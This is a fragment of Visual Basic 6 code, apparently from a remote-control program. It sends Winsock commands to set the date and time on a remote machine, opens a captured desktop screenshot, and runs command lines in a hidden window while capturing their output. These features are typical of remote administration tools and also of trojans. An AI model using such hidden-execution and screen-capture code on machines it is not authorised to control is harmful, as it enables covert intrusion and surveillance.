            bGettingDesktop = False
            Shell "C:\Windows\mspaint.exe" & App.Path & "\desktop.bmp", vbMaximizedFocus
        End If
'''
'Settig date and time
Case "settime2":
    Winsock1.SendData "settime2|" & Text22.Text


End Select
End Sub
Sub Redirect(cmdLine As String, objTarget As Object)
  Dim i%, t$
  Dim pa As SECURITY_ATTRIBUTES
  Dim pra As SECURITY_ATTRIBUTES
  Dim tra As SECURITY_ATTRIBUTES
  Dim pi As PROCESS_INFORMATION
  Dim sui As STARTUPINFO
  Dim hRead As Long
  Dim hWrite As Long
  Dim bRead As Long
  Dim lpBuffer(1024) As Byte
  pa.nLength = Len(pa)
  pa.lpSecurityDescriptor = 0
  pa.bInheritHandle = True
  pra.nLength = Len(pra)
  tra.nLength = Len(tra)
  If CreatePipe(hRead, hWrite, pa, 0) <> 0 Then
    sui.cb = Len(sui)
    GetStartupInfo sui
    sui.hStdOutput = hWrite
    sui.hStdError = hWrite
    sui.dwFlags = STARTF_USESHOWWINDOW Or STARTF_USESTDHANDLES
    sui.wShowWindow = SW_HIDE
    If CreateProcess(vbNullString, cmdLine, pra, tra, True, 0, Null, vbNullString, sui, pi) <> 0 Then
      SetWindowText objTarget.hwnd, ""
      Do
        Erase lpBuffer()
        If ReadFile(hRead, lpBuffer(0), 1023, bRead, ByVal 0&) Then
          SendMessage objTarget.hwnd, EM_SETSEL, -1, 0
          SendMessage objTarget.hwnd, EM_REPLACESEL, False, lpBuffer(0)
          DoEvents
        Else
          CloseHandle pi.hThread
          CloseHandle pi.hProcess
          Exit Do
        End If
        CloseHandle hWrite
      Loop
      CloseHandle hRead
    End If
  End If
End Sub

